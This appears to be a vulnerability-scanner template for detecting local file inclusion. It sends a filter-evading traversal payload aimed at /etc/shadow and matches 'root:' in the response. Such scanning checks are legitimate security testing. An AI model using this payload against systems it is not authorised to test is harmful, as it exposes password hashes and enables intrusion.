id: lfi3-082
name: 'Traversal to system file via path'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via path'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      path:
        - '....//....//etc/shadow'
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
